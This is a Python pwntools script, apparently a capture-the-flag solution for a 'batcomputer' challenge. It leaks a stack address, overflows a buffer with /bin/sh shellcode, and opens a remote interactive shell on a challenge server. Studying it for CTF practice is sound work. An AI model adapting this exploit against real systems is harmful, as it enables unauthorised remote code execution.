#!/usr/bin/python3

from pwn import *

def main ():
    #context.log_level = 'DEBUG' 
    context(os='linux', arch='amd64')
    #io = process('./batcomputer')
    io = remote('178.128.40.63', 30829)

    #Step0
    #enumerated the binary
    password = "b4tp@$$w0rd!"
    return_address_offset = 84
    max_payload_length = 137


    #Step1
    #Get the stack address
    io.sendlineafter('> ', '1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2,len(stack_address),2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address, endian='big')
    log.success(f'Leaked stack address is: {p64(stack_address)}')
    #print(stack_address)

    #Step2
    #Buffer overflow
    io.sendlineafter('> ', '2')
    io.sendlineafter('password: ', password)
    shellcode = asm(
    	shellcraft.popad() +
    	shellcraft.sh()
    ) 
    padding = b'A' * (return_address_offset - len(shellcode))
    payload = shellcode + padding + p64(stack_address) 
    #assert len(payload) <= max_payload_length, f'Payload "{len(payload)}" too long. Allowed:{max_payload_length}' 
    io.sendlineafter('commands: ', payload)
    

    #input('IDA')

    #Step3
    #Trigger the return 
    io.sendlineafter('> ', '3')

    io.interactive()

if __name__ == '__main__':
    main()
